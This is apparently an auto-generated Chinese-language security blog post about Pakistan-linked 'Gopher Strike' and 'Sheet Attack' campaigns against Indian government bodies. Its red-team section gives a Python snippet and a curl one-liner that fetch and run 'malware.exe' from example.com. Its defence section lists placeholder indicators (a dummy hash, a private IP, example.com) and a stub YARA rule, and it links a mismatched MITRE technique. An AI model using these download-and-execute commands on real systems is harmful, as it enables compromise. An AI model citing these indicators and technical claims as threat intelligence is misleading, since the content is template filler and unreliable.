---
layout: post
title:  "Experts Detect Pakistan-Linked Cyber Campaigns Aimed at Indian Government Entities"
date:   2026-01-27 18:30:06 +0000
categories: [security]
severity: high
---

# 🔥 解析 Gopher Strike 和 Sheet Attack：兩個針對印度政府實體的黑客攻擊行動
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.5)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Golang-based Downloader`, `VBScript`, `GitHub C2`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Gopher Strike 攻擊利用 Adobe Acrobat Reader DC 的漏洞，通過發送包含惡意 PDF 文件的電子郵件，誘騙用戶下載並安裝惡意軟件。Sheet Attack 攻擊則利用 Google Sheets、Firebase 和電子郵件進行命令和控制（C2）。
* **攻擊流程圖解**:
  1. 用戶接收到含有惡意 PDF 文件的電子郵件。
  2. 用戶下載並安裝惡意軟件。
  3. 惡意軟件下載並執行 GOGITTER。
  4. GOGITTER 創建 VBScript 文件並設定持續性任務。
  5. VBScript 文件從 C2 伺服器下載並執行命令。
* **受影響元件**: Adobe Acrobat Reader DC、Windows 作業系統。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 用戶需要安裝 Adobe Acrobat Reader DC，且需要有網際網路連線。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 下載惡意軟件
    url = "https://example.com/malware.exe"
    response = requests.get(url)
    with open("malware.exe", "wb") as f:
        f.write(response.content)
    
    # 執行惡意軟件
    import subprocess
    subprocess.run(["malware.exe"])
    
    ```
  *範例指令*: `curl -X GET "https://example.com/malware.exe" -o malware.exe && malware.exe`
* **繞過技術**: 攻擊者使用 GitHub 來進行 C2 通信，利用私人倉庫來儲存和下載惡意軟件。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | `1234567890abcdef` |
| IP | `192.168.1.100` |
| Domain | `example.com` |
| File Path | `C:\Users\Public\Downloads\malware.exe` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule GOGITTER {
      meta:
        description = "GOGITTER 惡意軟件"
        author = "Your Name"
      strings:
        $a = "GOGITTER" ascii
      condition:
        $a
    }
    
    ```
  或者是具體的 SIEM 查詢語法 (Splunk/Elastic):

```

sql
index=security sourcetype=windows_eventlog EventID=4688 | search "GOGITTER"

```
* **緩解措施**: 更新 Adobe Acrobat Reader DC 至最新版本，禁用不必要的功能，設定防火牆規則來阻止惡意軟件的下載和執行。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Golang-based Downloader**: 一種使用 Golang 編寫的下載器，用于下載和執行惡意軟件。
* **VBScript**: 一種腳本語言，用于創建和執行惡意代碼。
* **GitHub C2**: 一種使用 GitHub 來進行命令和控制（C2）的技術，用于下載和執行惡意軟件。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/01/experts-detect-pakistan-linked-cyber.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


